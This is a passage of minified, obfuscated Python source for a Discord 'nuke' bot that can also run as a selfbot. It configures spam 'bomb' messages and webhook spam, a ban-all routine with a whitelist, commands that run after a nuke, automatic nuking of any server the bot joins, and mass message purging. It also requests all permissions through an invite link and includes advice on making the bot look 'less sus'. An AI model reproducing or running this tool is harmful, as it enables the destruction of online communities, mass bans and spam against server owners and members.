	AS='On bot start status has been set to `{args}`.';AR='Types';AE='Config is saved';A5='Features';A2='Status';t='Usage';l='(*)Config is not saved';T=command;G=ctx;B=args;global C,AA
	async def w(n,title,array):
		L=array;J=title
		if not n.isdigit()or(n:=P(n)-1)<0:await A(G,An);return
		M=p;B=F(L)
		if B==0:return await G.send(f"{J} count: 0")
		C=n*U;E=C+U
		if C>B-U:
			if C>B:await G.send(Ao);return
			E=C+B%U
		else:E=C+U
		for N in i(C,E,1):
			D=L[N]
			if F(D)>17:D=D[:17]+BN
			M+=f"{K(N+1)}) {D}\n"
		Q=h(0,16777215);I=O.Embed(title=J,description=f"Total count: {K(B)}; color: #{o(Q)[2:].zfill(6)}",color=Q);I.add_field(name='Items',value=M,inline=H);I.set_footer(text=f"{n+1}/{K(A4(B/U))}\n"+(AE if m()else l));await G.send(embed=I)
	if T is D:
		M=[];N=[];s=C.copy();N.append(Z)
		if s[Z][y]is D or F(s[Z][d])==0:M.append(e)
		else:M.append(f)
		N.append(Q)
		if F(s[Q][u])==0 or F(s[Q][q])==0 or F(s[Q][v])==0:M.append(e)
		else:M.append(f)
		del s[Z];del s[Q]
		for A1 in s:
			N.append(A1)
			if C[A1]is D or type(C[A1]).__name__==r and F(C[A1])==0:M.append(e)
			else:M.append(f)
		R=h(0,16777215);I=O.Embed(title='Nuking features',description=f":white_check_mark: = Ready to use\n:x: = Needs to config\ncolor: #{o(R)[2:].zfill(6)}",color=R);I.add_field(name=A2,value=b.join(M),inline=H);I.add_field(name=A5,value=b.join(N),inline=H);I.add_field(name=t,value=f"Use `{C[S]}config <feature>` to get more information about how to config that feature.\n\n`{C[S]}config save <file name>` to save the current config. If you save the config as `default.json` the bot next time will directly start with whatever is in that `.json` file.",inline=V);I.set_footer(text=AE if m()else l);await G.send(embed=I);return
	T=T.lower()
	if T==a or T=='permission'or T=='perms'or T=='perm':
		if B is D:
			M=[];N=[];N.append(a)
			if F(C[a])==0:M.append(e)
			else:M.append(f)
			R=h(0,16777215);I=O.Embed(title='Permissions list',description=f"Permissions for using the bot are given to the users.\n\n:white_check_mark: = Ready to use\n:x: = Needs to config\ncolor: #{o(R)[2:].zfill(6)}",color=R);I.add_field(name=A2,value=b.join(M),inline=H);I.add_field(name=A5,value=b.join(N),inline=H);I.add_field(name=t,value=f"`permissions add <userTag or userID> [userTag or userID] [user...` - grant permissions to the given user(s)\n\n`permissions remove <line number> [line number] [line...` - remove line(s) from the list\n\n`permissions list [page number]` - list all users that are in the permission list",inline=V);I.set_footer(text=AE if m()else l);await G.send(embed=I)
		else:
			B=B.split()
			def AJ(checkingID):
				for A in i(F(C[a])):
					if C[a][A]==checkingID:return H,A
				return V,D
			if B[0]==z:
				del B[0]
				for AH in B:
					AK,AL=AJ(AH)
					if AK:await A(G,f"Failed to add `{C[a][AL]}`. Already existed the permission list.");continue
					else:C[a].append(AH)
			elif B[0]==A0:
				if F(B)>1:
					del B[0];J=1;X=F(C[a])
					for L in B:
						if L.isdigit()and 0<=(L:=P(L))-J<=X-J:del C[a][L-J];J+=1
						else:await A(G,f"Skipped deleting line `{L}` -> not an integer between 1 and {K(X)}.")
					await A(G,f"Successfully removed `{K(J-1)}` items.")
				else:await A(G,f"Enter line(s) to remove from bomb_messages fixed list.")
			elif B[0]==r:await w(B[1]if F(B)>1 else W,'permission list',C[a])
			else:await A(G,f"Unknown operation: `{B[1]}`")
	elif T==Z or T=='bomb_message'or T=='bomb':
		if B is D:
			M=[];N=[];N.append(y)
			if C[Z][y]is D:M.append(e)
			else:M.append(f)
			N.append(d)
			if F(C[Z][d])==0:M.append(e)
			else:M.append(f)
			R=h(0,16777215);I=O.Embed(title=Z,description=f'''Config for all the bomb commands.
When you run bomb commands like `{C[S]}channelbomb 100 fixed` the fixed is the type of word list you are going to use. In this case the word list is going to randomly pick texts from the "fixed" list.

:white_check_mark: = Ready to use
:x: = Needs to config
color: #{o(R)[2:].zfill(6)}''',color=R);I.add_field(name=A2,value=b.join(M),inline=H);I.add_field(name=AR,value=b.join(N),inline=H);I.add_field(name=t,value=f"""`bomb_messages fixed add <command>` - add contents to the back of the list

`bomb_messages fixed remove <line number> [line number] [line...` - remove line(s) from the list

`bomb_messages fixed list [page number]` - list contents that are in the content list

`bomb_messages random <character length>` - sets character length for bomb commands like `{C[S]}kaboom 100 b64`(b64 = base64) """,inline=V);I.set_footer(text=AE if m()else l);await G.send(embed=I)
		else:
			B=B.split()
			if B[0].lower()==y:
				if F(B)>1 and B[1].isdigit()and 1<=(AI:=P(B[1]))<=1024:C[Z][y]=AI;await A(G,f"Random-message length has been set to `{K(AI)}`.")
				else:await A(G,'Please enter a positive integer that is between 1 and 1024.')
			elif B[0].lower()==d:
				if B[1]==z:
					if F(B)>2 and 1<=F((Y:=j.join(B[2:])))<=100:C[Z][d].append(Y);await A(G,f"Text added. Character length: `{K(F(Y))}`.")
					else:await A(G,f"Please enter something that has 1 to 100 characters.")
				elif B[1]==A0:
					if F(B)>2:
						del B[0],B[0];J=1;X=F(C[Z][d])
						for L in B:
							if L.isdigit()and 0<=(L:=P(L))-J<=X-J:del C[Z][d][L-J];J+=1
							else:await A(G,f"Skipped deleting line `{L}` -> not an integer between 1 and {K(X)}.")
						await A(G,f"Successfully removed `{K(J-1)}` items.")
					else:await A(G,f"Enter line(s) to remove from bomb_messages fixed list.")
				elif B[1]==r:await w(B[2]if F(B)>2 else W,'bomb_messages fixed list',C[Z][d])
				else:await A(G,f"Unknown operation: `{B[1]}`")
			else:await A(G,f"Unable to find {B[0]} config.")
	elif T==Q:
		if B is D:
			M=[];N=[]
			for A1 in C[Q]:
				N.append(A1)
				if F(C[Q][A1])==0:M.append(e)
				else:M.append(f)
			R=h(0,16777215);I=O.Embed(title=Q,description=f"Using webhook to spam messages. To send a message from discord webhook it requires 3 items: usernames, profile picture, and contents. For profile picture you can only put an image URL or put `none` for no pfp.\n\n:white_check_mark: = Ready to use\n:x: = Needs to config\ncolor: #{o(R)[2:].zfill(6)}",color=R);I.add_field(name=A2,value=b.join(M),inline=H);I.add_field(name=AR,value=b.join(N),inline=H);I.add_field(name=t,value=f"`webhook_spam <type> add <command>` - add contents to the back of the list\n\n`webhook_spam <type> remove <line number> [line number] [line...` - remove line(s) from the list\n\n`webhook_spam <type> list [page number]` - list contents that are in the content list",inline=V);I.set_footer(text=f"Config is saved"if m()else l);await G.send(embed=I)
		else:
			B=B.split()
			if B[0]==u or B[0]==BV:
				if B[1]==z:
					if F(B)>2 and 0<F((Y:=j.join(B[2:])))<=32:C[Q][u].append(Y);await A(G,f"Text added. Character length: `{K(F(Y))}`.")
					else:await A(G,f"Please enter something that has 1 to 32 characters.")
				elif B[1]==A0:
					if F(B)>2:
						del B[0],B[0];J=1;X=F(C[Q][u])
						for L in B:
							if L.isdigit()and 0<=(L:=P(L))-J<=X-J:del C[Q][u][L-J];J+=1
							else:await A(G,f"Skipped deleting line `{L}` -> not an integer between 1 and {K(X)}.")
						await A(G,f"Successfully removed `{K(J-1)}` items.")
					else:await A(G,f"Enter line(s) to remove from usernames.")
				elif B[1]==r:await w(B[2]if F(B)>2 else W,'webhook_spam usernames list',C[Q][u])
				else:await A(G,f"Unknown operation: `{B[1]}`")
			elif B[0]==q or B[0]=='pfp_url'or B[0]=='pfp':
				if B[1]==z:
					if F(B)>1 and B[2].lower()=='none':C[Q][q].append(D);await A(G,f"No pfp item has been added")
					elif F(B)>1 and(Y:=B[2].startswith((Ap,Aq))):C[Q][q].append(Y);await A(G,f"URL added.")
					else:await A(G,f"Please enter an **image URL**. Note: the link must start with http(s) protocals. Or enter `none` for no pfp.")
				elif B[1]==A0:
					if F(B)>2:
						del B[0],B[0];J=1;X=F(C[Q][q])
						for L in B:
							if L.isdigit()and 0<=(L:=P(L))-J<=X-J:del C[Q][q][L-J];J+=1
							else:await A(G,f"Skipped deleting line `{L}` -> not an integer between 1 and {K(X)}.")
						await A(G,f"Successfully removed `{K(J-1)}` items.")
					else:await A(G,f"Enter line(s) to remove from pfp_urls.")
				elif B[1]==r:await w(B[2]if F(B)>2 else W,'webhook_spam pfp_urls list',C[Q][q])
				else:await A(G,f"Unknown operation: `{B[1]}`")
			elif B[0]==v or B[0]==BW:
				if B[1]==z:
					if F(B)>1 and 0<F((Y:=j.join(B[2:])))<=2000:C[Q][v].append(Y);await A(G,f"Text added. Character length: `{K(F(Y))}`.")
					else:await A(G,f"Please enter something that has 1 to 2000 characters.")
				elif B[1]==A0:
					if F(B)>2:
						del B[0],B[0];J=1;X=F(C[Q][v])
						for L in B:
							if L.isdigit()and 0<=(L:=P(L))-J<=X-J:del C[Q][v][L-J];J+=1
							else:await A(G,f"Skipped deleting line `{L}` -> not an integer between 1 and {K(X)}.")
						await A(G,f"Successfully removed `{K(J-1)}` items.")
					else:await A(G,f"Enter line(s) to remove from contents.")
				elif B[1]==r:await w(B[2]if F(B)>2 else W,'webhook_spam contents list',C[Q][v])
				else:await A(G,f"Unknown operation: `{B[1]}`")
			else:await A(G,f"Unknown type: `{B[0]}`")
	elif T==c:
		if B is D:
			M=[];N=[];N.append(c)
			if F(C[c])==0:M.append(e)
			else:M.append(f)
			R=h(0,16777215);I=O.Embed(title='After commands',description=f'All the commands in this list will run after `{C[S]}nuke`. It can be disabled by adding "false" after the nuke command: `{C[S]}nuke false`.\n\n:white_check_mark: = Ready to use\n:x: = Needs to config\ncolor: #{o(R)[2:].zfill(6)}',color=R);I.add_field(name=A2,value=b.join(M),inline=H);I.add_field(name=A5,value=b.join(N),inline=H);I.add_field(name=t,value=f"""`after add <command>` - add command to the back of the command list

`after remove <line number> [line number] [line...` - remove line(s) in the command list

`after insert <line number> <command>` - insert command after the given line. Note: use `insert 0 <command>` to insert the command to the first line

`after list [page number]` - list commands that are in the command list""",inline=V);I.set_footer(text=f"Config is saved"if m()else l);await G.send(embed=I)
		else:
			B=B.split()
			if B[0]==z:
				if F(B)>1:Y=j.join(B[1:]);C[c].append(Y);await A(G,f"Command added. Character length: `{K(F(Y))}`.")
				else:await A(G,f"Please enter the command you want to add after line `{F(C[c])}`.")
			elif B[0]==A0:
				if F(B)>1:
					del B[0];J=1;X=F(C[c])
					for L in B:
						if L.isdigit()and 0<=(L:=P(L))-J<=X-J:del C[c][L-J];J+=1
						else:await A(G,f"Skipped deleting line `{L}` -> not an integer between 1 and {K(X)}.")
					await A(G,f"Successfully removed `{K(J-1)}` items.")
				else:await A(G,f"Enter the line(s) that you want to remove from after commands.")
			elif B[0]=='insert':
				if F(B)>2 and B[1].isdigit():
					if not 0<=(AP:=P(B[1]))<=F(C[c])or F(C[c])==0:await A(G,f"Line `{B[1]}` doesn't exist.");return
					C[c].insert(AP,j.join(B[2:]));await A(G,f"Added command after line `{B[1]}`.")
				else:await A(G,'Insert usage: `after insert <after line #> <command...>`')
			elif B[0]==r:await w(B[1]if F(B)>1 else W,'after command(s) list',C[c])
			else:await A(G,f"Unknown operation: `{B[0]}`")
	elif T==A6:
		if B is D:R=h(0,16777215);I=O.Embed(title=A6,description=f"Whenever the bot boot up the status will be set to a given status.\n\ncolor: #{o(R)[2:].zfill(6)}",color=R);I.add_field(name=A2,value=f"{C[A6]}",inline=H);I.add_field(name=A5,value=A6,inline=H);I.add_field(name=t,value=f"`bot_status <on start status>` - set the on start status. Available on start status are `online`, `offline`, `idle`, and `dnd` or `do_not_disturb`. By default it is set to `offline`.",inline=V);I.set_footer(text=f"Config is saved"if m()else l);await G.send(embed=I)
		elif(B:=B.lower())in[Al,Ab,BX,BY,BZ]:C[A6]=B;await A(G,AS)
		else:await A(G,'Available on start status are `online`, `offline`, `idle`, and `dnd` or `do_not_disturb`.')
	elif T==x:
		if B is D:R=h(0,16777215);I=O.Embed(title=x,description=f"If you are using a selfbot, then you don't have to do anything to this section. This bot_permission section is for normal bot invite URL that will ask the person inviting it for permission/roles (ex. admin, server manager). The default is set to 2146958847, which asks for all permissions. If you want to make the bot less sus, you can remove the permissions that are not needed.\n\ncolor: #{o(R)[2:].zfill(6)}",color=R);I.add_field(name='Value',value=f"{C[x]}",inline=H);I.add_field(name=A5,value=x,inline=H);I.add_field(name=t,value=f"`bot_permission <value>` - set permissions value to the given number. Use this [permission calculator](https://wizbot.cc/permissions-calculator/?v=0) to help you calculate the values. Note: if you are going to use that calculator all you need is to copy the number that is display at the top, and then use this command.",inline=V);I.set_footer(text=f"Config is saved"if m()else l);await G.send(embed=I)
		elif B.isdigit()and 0<=P(B)<=2146958847:C[x]=B;await A(G,'Bot permission has been set to `{args}`.')
		else:await A(G,'Please enter a value between 0 and 2146958847.')
	elif T=='save':
		def AQ(message):return message.author.id==G.message.author.id
		if B is D:await A(G,f"You need to name the file. Use `{C[S]}save <file name>`.");return
		A8=g.path.join(AU().absolute().__str__(),Am);A9=g.path.join(A8,B.translate(Aw))
		if g.path.isfile(A9):
			await A(G,f"Configuration file named {B} already exist. Do you want to overwrite it? [Y/n]")
			while H:
				try:
					A7=(await E.wait_for(BR,check=AQ,timeout=10)).content.lower()
					if A7=='y'or A7=='yes':
						with AD(A9,'w')as AC:AC.write(k.dumps(C));break
					elif A7=='n'or A7=='no':await A(G,f"Saving cancelled.");return
					await A(G,f"Yes or no.")
				except (A3.exceptions.TimeoutError,O.ext.commands.errors.CommandInvokeError):await A(G,'Took too long to answer.');return
		else:
			if not g.path.isdir(A8):g.mkdir(A8)
			with AD(A9,'w+')as AC:AC.write(k.dumps(C))
		global AA;AA=Ae(C);await A(G,'Finished saving.')
	elif T==AG:
		if B is D:
			M=[];N=[];N.append('Log response from requests')
			if AB:M.append(f)
			else:M.append(e)
			N.append('Log messages in console')
			if AM:M.append(f)
			else:M.append(e)
			N.append('Log messages in discord chat')
			if AN:M.append(f)
			else:M.append(e)
			N.append('Log any errors')
			if AO:M.append(f)
			else:M.append(e)
			R=h(0,16777215);I=O.Embed(title=AG,description=f"""Verbose is the log level. Meaning that if you don't want any one of the logs to spam rate limiting errors or whatever errors that the bot is going to throw at you, you can disable them to prevent some lag.

Current verbose value: `{K(C[AG])}`
:white_check_mark: = Enabled
:x: = Disabled
color: #{o(R)[2:].zfill(6)}""",color=R);I.add_field(name=A2,value=b.join(M),inline=H);I.add_field(name='Logs',value=b.join(N),inline=H);I.add_field(name=t,value=f'''`verbose <value>` - enable and disable the logs. Subtracting the values below from the current verbose to disable the log(s) you want, and adding the values will enable them. For example if I want to disable "Log any error" I will subtract 8 from 15 to get 7 and use 7 as the new verbose value to set, if I want to disable more like "Log response from request" I will substract 1 from 7 to get 6. To enable them back just add 8 and 1 to the current verbose value.

`1` - Log response from requests
`2` - Log messages in console
`4`- Log messages in discord chat
`8` - Log any errors.''',inline=V);I.set_footer(text=f"Config is saved"if m()else l);await G.send(embed=I)
		elif B.isdigit()and 0<=(B:=P(B))<=15:C[AG]=B;Af();await A(G,AS)
		else:await A(G,'You can only enter a positve integer between or on 0 and 15.')
	elif T==n:
		if B is D:
			M=[];N=[];N.append(n)
			if F(C[n])==0:M.append(e)
			else:M.append(f)
			R=h(0,16777215);I=O.Embed(title='Ban whitelist',description=f"Ban whitelist is used for telling `{C[S]}banAll` and `{C[S]}nuke` to not ban the users in the list. You can put discord tag or discord ID in the list, but it is recommended to use discord ID because in the pass there has some uncheckable discord tags.\n\n:white_check_mark: = Ready to use\n:x: = Needs to config\ncolor: #{o(R)[2:].zfill(6)}",color=R);I.add_field(name=A2,value=b.join(M),inline=H);I.add_field(name=A5,value=b.join(N),inline=H);I.add_field(name=t,value=f"`ban_whitelist add <command>` - add user to the back of the command list\n\n`ban_whitelist remove <line number> [line number] [line...` - remove line(s) in the ban whitelist\n\n`ban_whitelist list [page number]` - list users that are in the ban whitelist",inline=V);I.set_footer(text=f"Config is saved"if m()else l);await G.send(embed=I)
		else:
			B=B.split()
			if B[0]==z:
				if F(B)>1:Y=j.join(B[1:]);C[n].append(Y);await A(G,f"User added. Character length: `{K(F(Y))}`.")
				else:await A(G,f"Please enter the userID or userTag that you want to add after line `{K(F(C[c]))}`.")
			elif B[0]==A0:
				if F(B)>1:
					del B[0];J=1;X=F(C[n])
					for L in B:
						if L.isdigit()and 0<=(L:=P(L))-J<=X-J:del C[n][L-J];J+=1
						else:await A(G,f"Skipped deleting line `{L}` -> not an integer between 1 and {K(X)}.")
					await A(G,f"Successfully removed `{K(J-1)}` items.")
				else:await A(G,f"Enter line(s) to remove from usernames.")
			elif B[0]==r:await w(B[1]if F(B)>1 else W,'ban whitelist',C[n])
			else:await A(G,f"Unknown operation: `{B[0]}`")
	elif T==BJ:await A(G,'This feature has been disable for now due to unhandled slow/bad proxies.')
	elif T=='prefix'or T==S:
		if B is D:await A(G,f"Use `` {command_prefix}config command_prefix <command_prefix> ``")
		else:C[S]=E.command_prefix=B;await A(G,'Command prefix changed.')
	elif T==AF:
		if B is D:await A(G,'Usage: `token <new token>` - new token for this config. Restarting the bot will be required. And remember to save the config before restarting.')
		else:C[AF]=B;await A(G,'New token has been set.')
	else:await A(G,f"Unable to find the config. `{T}`")
@G.check(J)
@E.command(name='checkRolePermissions',aliases=['check','crp'])
async def CD(ctx,name,n=W):
	C=ctx
	if not await N(C):return
	if not n.isdigit()or(n:=P(n)-1)<0:await A(C,An);return
	I=Y(B.members,AP(name))
	if I is D:await A(C,f"Unable to found {name}.");return
	M=I.guild_permissions.value;Q=BH(I.guild_permissions,key=lambda p:p);F=p;G=31;E=n*U;J=E+U
	if E>G-U:
		if E>G:await C.send(Ao);return
		J=E+G%U
	else:J=E+U
	for R in i(E,J,1):
		S,T=Q[R]
		if T:F+=':white_check_mark: '
		else:F+=':x: '
		F+=S.replace('_',j).capitalize()+b
	try:L=O.Embed(title='User permissions',description=f"Encoded value: {K(M)} : 2147483647",color=O.Color.red());L.add_field(name='Permissions',value=F,inline=H);L.set_footer(text=f"{K(n+1)}/{K(A4(G/U))}");await C.send(embed=L)
	except:await C.send('```diff\n%s %d/%d```'%(F.replace(f,'+').replace(e,'-'),n+1,A4(G/U)))
@G.check(J)
@E.command(name='serverIcon',aliases=['si','changeServerIcon'])
async def CE(ctx,path=D):
	I='Successfully changed server icon.';E=ctx;C=path
	if not await N(E):return
	if C is D:await B.edit(icon=D);await A(E,f"Successfully removed the server icon from `{B.name}`.")
	elif C.startswith((Ap,Aq,BP,BQ)):
		try:await B.edit(icon=A1(R.get(C).content).read());L('Successfully changed the current server icon.')
		except:L(f'Unable to change the server icon to "{C}".')
	elif C[0]=='<':
		C=C.split(':')
		try:
			if C[0]=='<a':await B.edit(icon=O.File(A1(R.get(f"https://cdn.discordapp.com/emojis/{C[2][:-1]}.gif?v=1").content).read()))
			else:await B.edit(icon=A1(R.get(f"https://cdn.discordapp.com/emojis/{C[2][:-1]}.png?v=1").content).read())
			await A(E,I)
		except:raise
	elif g.path.isfile(C):
		with AD(C,'rb')as G:await B.edit(icon=G.read());await A(E,I)
	else:
		try:F=K(ord(C))+', '
		except:F=p
		H=C.encode(AE);w.stdout.buffer.write(f'"{C}" is not supported to be set as a server icon.'.encode(AE));L(F);await A(E,f"{C} is not supported to be set as a server icon.");await A(E,f"Character's bytes: {F}{H}")
@G.check(J)
@E.command(name='serverName',aliases=['sn','changeServerName'])
async def CF(ctx,*,name):
	C=ctx
	if not await N(C):return
	try:await B.edit(name=name);await A(C,f"Server name has been changed to `{name}`.")
	except O.errors.Forbidden:await A(C,'Unable to change server name.');raise
	except:raise
@G.check(J)
@E.command(name='purge',aliases=['clear'])
async def CG(ctx,n=D):
	B=ctx
	if not await N(B):return
	L('Purging messages...',H)
	if n is not D and(not n.isdigit()or(n:=P(n))<1):await A(B,Ar);return
	F=await B.channel.history(limit=n).flatten();L('Due to discord ratelimitings purging messages cannot be run in a fast pace. After every message the bot will timeout for 3 seconds',H);C=0
	for G in F:
		while H:
			await A3.sleep(C);E=R.delete(f"https://discord.com/api/v8/channels/{B.channel.id}/messages/{G.id}",headers=X)
			if E.status_code==429:C=E.json()[AH];L(f"ratelimiting reached. Purging delay has been set to -> {K(C)} seconds")
			else:break
@G.check(J)
@E.command(name='leave')
async def CH(ctx,name=D):
	F=name;C=ctx
	if F is D:
		if not await N(C):return
		await B.leave()
	else:
		G=Y(E.guilds,F)
		if G is D:await A(C,f"Unable to find server {F}.");return
		await G.leave()
	if not A2(C)and C.guild.id==B.id:L(f"{I.BLUE}Goodbye {B.name}! {I.YELLOW}-> {I.GREEN}Left {I.RESET}{B.name}.",H)
	else:await A(C,f"Goodbye {B.name}! -> Left {B.name}.")
@G.check(J)
@E.command(name='leaveAll')
async def CI(ctx):
	await A(ctx,"Leaving all servers. Note: You won't be able to message me after I left all servers.")
	for B in E.guilds:await B.leave()
	L('Left all servers.',H)
@G.check(J)
@E.command(name='joinNuke',aliases=['nukeOnJoin','join nuke'])
async def CJ(ctx,true_or_false):
	C=true_or_false;B=ctx;global AV,AK
	if C.lower()=='true':AV=B;AK=H;await A(B,'Nuke on bot joining a new server has been turned on.')
	elif C.lower()=='false':AK=V;await A(B,'Nuke on bot joining a new server has been turned off.')
	else:await A(B,'Invalid flag: true or false. Note: true or false is not case sensitive.')
@G.check(J)
@E.command(name='changeStatus',aliases=['cs'])
async def AZ(ctx,status):
	A=status
	if A==Ab:await E.change_presence(status=O.Status.offline)
	elif A=='invisible':await E.change_presence(status=O.Status.invisible)
	elif A==Al:await E.change_presence(status=O.Status.online)
	elif A==BX:await E.change_presence(status=O.Status.idle)
	elif A==BY or A==BZ:await E.change_presence(status=O.Status.do_not_disturb)
@G.check(J)
@E.command(name='link',aliases=['l'])
async def CK(ctx):
	if not t:await ctx.channel.send(f"https://discord.com/api/oauth2/authorize?client_id={E.user.id}&permissions={C[x]}&scope=bot")
	else:await A(ctx,f"This account is not a bot :). You can join servers with invite codes.")
@G.check(J)
@E.command(name='autoNick',aliases=[Ac])
async def CL(ctx):
	if not await N(ctx):return
	global A7
	if not A7:
		L(f"{I.CYAN}Auto nickname is on.",H);A7=H
		while A7:await B.me.edit(nick=p.join(AT(Ah,k=10)))
	else:L(f"{I.BLUE}Auto nickname is off.",H);A7=V
@G.check(J)
@E.command(name='autoStatus',aliases=['as'])
async def CM(ctx):
	global A8
	if not A8:
		L(f"{I.CYAN}Auto status is on.",H);A8=H
		while A8:await E.change_presence(status=O.Status.online);await A3.sleep(Ad()+0.3);await E.change_presence(status=O.Status.offline);await A3.sleep(Ad()+0.3)
	else:L(f"{I.BLUE}Auto status is off.",H);A8=V
@G.check(J)
@E.command(name='off',aliases=['logout','logoff','shutdown','stop'])
async def CN(ctx):await AZ(D,Ab);await E.logout()
from functools import wraps
from asyncio.proactor_events import _ProactorBasePipeTransport as Aj
def BC(func):
	@wraps(func)
	def A(self,*A,**B):
		try:return func(self,*A,**B)
		except RuntimeError as C:
			if K(C)!='Event loop is closed':raise
	return A
Aj.__del__=BC(Aj.__del__)
try:E.run(C[AF],bot=not t)
except O.PrivilegedIntentsRequired:M('PrivilegedIntentsRequired: This field is required to request for a list of members in the discord server that the bot is connected to. Watch https://youtu.be/DXnEFoHwL1A?t=44 to see how to turn on the required field.');exit()
except Ak as BD:M(BD)
finally:w.stdout.write('Exiting...               \n')
